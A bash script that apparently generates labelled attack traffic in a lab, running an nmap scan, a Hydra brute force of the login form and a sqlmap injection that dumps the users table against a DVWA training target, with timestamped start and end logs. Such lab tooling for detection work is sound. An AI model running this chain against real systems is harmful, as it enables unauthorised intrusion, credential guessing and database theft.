#!/usr/bin/env bash
set -euo pipefail

LOG_FILE="${1:-/logs/attack_log.txt}"
TARGET_IP="${2:-10.10.0.10}"

# Resolve passwords file location
if [ -f "/root/attacks/passwords.txt" ]; then
    PASSWORDS_FILE="/root/attacks/passwords.txt"
elif [ -f "./attacker/passwords.txt" ]; then
    PASSWORDS_FILE="./attacker/passwords.txt"
else
    PASSWORDS_FILE="passwords.txt"
fi

# Ensure log directory exists
mkdir -p "$(dirname "$LOG_FILE")"

# Helper for UTC ISO-8601 timestamps
timestamp() {
    date -u +"%Y-%m-%dT%H:%M:%SZ"
}

log_event() {
    local action="$1"
    local attack="$2"
    local ts
    ts=$(timestamp)
    echo "${action} ${attack} ${ts}" | tee -a "$LOG_FILE"
}

echo "=== Initializing Attack Simulation Engine ==="

# 1. Obtain Authenticated Session Cookie from DVWA
echo "[+] Logging in to DVWA to acquire authenticated session cookie..."
LOGIN_HTML=$(curl -s "http://${TARGET_IP}/login.php")
USER_TOKEN=$(echo "$LOGIN_HTML" | grep -oP "name='user_token' value='\K[a-f0-9]+" || true)
PHPSESSID=$(curl -s -i "http://${TARGET_IP}/login.php" | grep -oP "PHPSESSID=\K[^;]+" | head -n 1 || true)

if [ -z "$PHPSESSID" ]; then
    # Fallback if first request didn't return cookie
    PHPSESSID=$(curl -s -c - "http://${TARGET_IP}/login.php" | grep "PHPSESSID" | awk '{print $7}' || true)
fi

# Submit credentials
curl -s -b "PHPSESSID=${PHPSESSID}; security=low" \
     -d "username=admin&password=password&Login=Login&user_token=${USER_TOKEN}" \
     "http://${TARGET_IP}/login.php" > /dev/null

echo "[+] Authenticated session established: PHPSESSID=${PHPSESSID}"
sleep 2

# ----------------------------------------------------
# Attack 1: Nmap Service & Port Scan
# ----------------------------------------------------
log_event "START" "nmap_scan"
echo "[+] Running Nmap scan against ${TARGET_IP}..."
NMAP_OUT="$(dirname "$LOG_FILE")/nmap_results.txt"
nmap -sV -sT -p 1-1000 "${TARGET_IP}" -oN "$NMAP_OUT" || true
log_event "END" "nmap_scan"

sleep 5  # Inter-attack cooldown for distinct network boundary

# ----------------------------------------------------
# Attack 2: Hydra Form Brute Force
# ----------------------------------------------------
log_event "START" "hydra_bruteforce"
echo "[+] Running Hydra brute force against DVWA..."
HYDRA_OUT="$(dirname "$LOG_FILE")/hydra_results.txt"
hydra -l admin -P "${PASSWORDS_FILE}" "${TARGET_IP}" http-get-form \
  "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: PHPSESSID=${PHPSESSID}; security=low:F=username and/or password incorrect" \
  -vV -o "$HYDRA_OUT" || true
log_event "END" "hydra_bruteforce"

sleep 5  # Inter-attack cooldown

# ----------------------------------------------------
# Attack 3: sqlmap SQL Injection & Data Dump
# ----------------------------------------------------
log_event "START" "sqlmap_sqli"
echo "[+] Running sqlmap against DVWA SQLi endpoint..."
SQLMAP_OUT="$(dirname "$LOG_FILE")/sqlmap_out"
sqlmap -u "http://${TARGET_IP}/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=${PHPSESSID}; security=low" \
  --batch \
  --dump -T users -D dvwa \
  --output-dir="$SQLMAP_OUT" || true
log_event "END" "sqlmap_sqli"

echo "=== Attack Simulation Completed Successfully ==="
echo "[+] Log summary stored in ${LOG_FILE}:"
cat "$LOG_FILE"
